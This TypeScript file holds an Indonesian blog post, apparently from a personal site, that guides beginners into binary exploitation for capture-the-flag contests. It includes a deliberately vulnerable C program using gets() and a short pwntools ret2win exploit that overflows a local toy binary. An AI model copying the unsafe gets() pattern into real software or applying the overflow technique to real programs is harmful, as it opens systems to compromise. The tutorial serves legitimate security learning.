import { BlogPost } from '../blogTypes';

export const caraBelajarPwn: BlogPost = {
    id: 'cara-belajar-pwn',
    title: 'Panduan Memulai Kategori PWN untuk Pemula',
    date: '2026-06-08',
    excerpt: 'Langkah-langkah praktis, pemahaman dasar memori, dan tools terbaik untuk mulai menguasai Binary Exploitation dari nol.',
    tags: ['Pwn', 'Binary Exploitation', 'Tutorial', 'Reverse'],
    author: 'Nattt',
    readTime: '5 min read',
    content: `Menembus pertahanan memori biner (binary exploitation/PWN) memang menantang, tapi sangat seru setelah kamu memahami cara kerja komputer di balik layar. PWN berfokus pada menemukan celah keamanan dalam program terkompilasi (binary) dan memanipulasinya untuk mendapatkan kontrol penuh atas sistem (misalnya memicu shell).

Berikut adalah roadmap praktis bagi kamu yang ingin memulai perjalanan di kategori PWN:

### 1. Pahami Cara Kerja Memori (Layout Stack)
Sebelum bisa merusak memori, kamu harus tahu dulu bagaimana memori itu disusun. Memori program dibagi menjadi beberapa bagian utama:
* **Stack**: Menyimpan variabel lokal dan alamat kembali (return address) fungsi. Ini adalah target utama untuk serangan *Buffer Overflow*.
* **Heap**: Menyimpan memori dinamis yang dialokasikan saat runtime (menggunakan \`malloc\`/\`free\`).
* **Code/Text**: Berisi instruksi mesin (assembly) yang akan dijalankan.

Perhatikan kode rentan C berikut:

\`\`\`c
#include <stdio.h>
#include <string.h>

void win() {
    printf("Selamat! Kamu berhasil memicu fungsi tersembunyi!\\n");
}

void vuln() {
    char buffer[64];
    printf("Masukkan input: ");
    gets(buffer); // Fungsi gets() SANGAT berbahaya karena tidak membatasi ukuran input!
}

int main() {
    vuln();
    return 0;
}
\`\`\`

Di atas, jika kita memasukkan input lebih dari 64 karakter, kita bisa menimpa return address fungsi \`vuln\` agar mengarah ke alamat fungsi \`win\`. Ini disebut **ret2win**.

### 2. Kuasai Perangkat Tempur (Tools)
Beberapa tools wajib untuk kategori PWN:
* **GDB dengan GEF (GDB Enhanced Features)** atau **pwndbg**: Debugger untuk menganalisis memori saat program berjalan secara real-time.
* **pwntools**: Library Python terbaik untuk menulis skrip eksploitasi (payload sender).
* **checksec**: Tool untuk memeriksa proteksi biner (NX, Canary, ASLR, PIE).

### 3. Contoh Skrip Eksploitasi Sederhana
Menggunakan **pwntools**, kita bisa menulis exploit script seperti ini:

\`\`\`python
from pwn import *

# Inisialisasi program
elf = ELF('./vuln_binary')
p = process('./vuln_binary')

# Buat payload: 64 bytes buffer + 8 bytes target EBP + alamat fungsi win
payload = b'A' * 72 + p64(elf.symbols['win'])

# Kirim payload
p.sendline(payload)

# Masuk ke mode interaktif
p.interactive()
\`\`\`

### 4. Latihan Terus Menerus
Cara terbaik belajar PWN adalah dengan praktik langsung. Kamu bisa mulai di situs-situs berikut:
* **pwn.college** (sangat direkomendasikan untuk dasar terstruktur)
* **ropemporium.com** (fokus belajar Return Oriented Programming)
* **pwnable.tw** / **pwnable.kr** (untuk tantangan tingkat lanjut)

Good Luck :)
`
};
